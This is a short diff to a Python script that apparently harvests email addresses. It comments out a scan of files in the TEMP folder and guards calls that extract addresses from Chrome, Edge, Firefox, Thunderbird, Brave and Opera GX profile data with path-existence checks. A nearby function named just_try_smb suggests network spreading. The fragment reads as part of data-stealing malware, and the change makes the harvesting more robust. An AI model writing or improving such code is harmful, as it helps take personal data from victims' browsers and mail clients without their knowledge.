@@ -437,20 +437,20 @@ def just_try_smb():
 
 emails = []
 
-for root, _, files in os.walk(os.getenv('TEMP')):
-    for file in files:
-        try:
-            with open(os.path.join(root,file), 'r', errors='ignore') as f:
-                data = f.read()
-                emails.extend(re.findall(email_pattern, data))
-        except: pass
+# for root, _, files in os.walk(os.getenv('TEMP')):
+#     for file in files:
+#         try:
+#             with open(os.path.join(root,file), 'r', errors='ignore') as f:
+#                 data = f.read()
+#                 emails.extend(re.findall(email_pattern, data))
+#         except: pass
 
-chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
-edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
-firefox_emails = firefox(firefox_path, email_pattern)
-thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
-brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
-gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isopera=True)
+if os.path.exists(chrome_path): chrome_emails = chromEdgeOnly(chrome_path, email_pattern, CHROME_BROWSER)
+if os.path.exists(edge_path): edge_emails = chromEdgeOnly(edge_path, email_pattern, EDGE_BROWSER)
+if os.path.exists(firefox_path): firefox_emails = firefox(firefox_path, email_pattern)
+if os.path.exists(thunderbird_path): thunderbird_emails = thunderbird(thunderbird_path, email_pattern)
+if os.path.exists(brave_path): brave_emails = chromEdgeOnly(brave_path, email_pattern, BRAVE_BROWSER)
+if os.path.exists(operagx_path): gx_emails = chromEdgeOnly(operagx_path, email_pattern, OPERAGX, isopera=True)
 
 # emails = chrome_emails + edge_emails + firefox_emails + thunderbird_emails
 emails.extend(chrome_emails)
